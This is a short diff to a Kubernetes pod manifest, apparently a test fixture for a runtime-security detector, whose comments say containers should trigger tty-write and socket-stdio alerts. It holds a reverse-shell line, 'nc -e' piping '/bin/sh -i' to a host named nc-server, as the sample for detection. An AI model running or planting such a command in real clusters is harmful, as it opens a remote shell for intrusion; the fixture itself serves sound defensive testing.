@@ -68,14 +68,15 @@ spec:
         - name: client
           image: busybox
           # Should trigger tty write.
+          tty: true
           command:
             - /bin/sh
             - -c
             - |-
-              ncat -e `/bin/sh -i` nc-server 8000
+              nc -e `/bin/sh -i` nc-server 8000
         # Should trigger stdio via socket.
         - name: client2
-          image: python3
+          image: python:3.9.19-slim-bullseye
           command:
             - /bin/sh
             - -c
